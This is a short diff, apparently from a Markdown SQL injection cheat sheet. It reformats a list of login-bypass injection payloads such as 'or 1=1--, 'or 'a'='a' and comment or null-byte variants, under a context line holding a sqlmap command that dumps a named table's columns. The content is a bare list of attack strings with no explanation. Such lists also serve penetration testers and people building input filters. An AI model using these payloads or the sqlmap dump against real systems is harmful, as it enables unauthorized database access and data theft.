@@ -38,63 +38,68 @@ sqlmap -u "url?prm=" -p prm -D dbname -T table_name -C column_name --dump --meth
  
  ```
  or 1=1 
-‘or 1=1
-“or 1=1
-or 1=1–
-‘or 1=1–
-“or 1=1–
 
-or 1=1#
+ ‘or 1=1
 
-‘or 1=1#
+ “or 1=1
 
-“or
+  or 1=1–
 
-1=1#
+ ‘or 1=1–
 
-or 1=1/*
+ “or 1=1–
 
-‘or 1=1/*
+  or 1=1#
 
-“or 1=1/*
+ ‘or 1=1#
 
-or 1=1;%00
+ “or
 
-‘or 1=1;%00
+  1=1#
 
-“or 1=1;%00
+  or 1=1/*
 
-‘or’
+ ‘or 1=1/*
 
-‘or
+ “or 1=1/*
 
-‘or’–
+  or 1=1;%00
 
-‘or–
+ ‘or 1=1;%00
 
-or a=a
+ “or 1=1;%00
 
-‘or a=a
+ ‘or’
 
-“or a=a
+ ‘or
 
-or a=a–
+ ‘or’–
 
-‘or a=a —
+ ‘or–
 
-“or a=a–
+  or a=a
 
-or ‘a’=’a’
+ ‘or a=a
 
-‘or ‘a’=’a’
+ “or a=a
 
-“or ‘a’=’a’
+  or a=a–
 
-‘)or(‘a’=’a’
+ ‘or a=a —
 
-“)”a”=”a”
+ “or a=a–
 
-‘)’a’=’a
+  or ‘a’=’a’
 
-‘or”=’
+ ‘or ‘a’=’a’
+
+ “or ‘a’=’a’
+
+ ‘)or(‘a’=’a’
+
+ “)”a”=”a”
+
+ ‘)’a’=’a
+
+ ‘or”=’
 ```
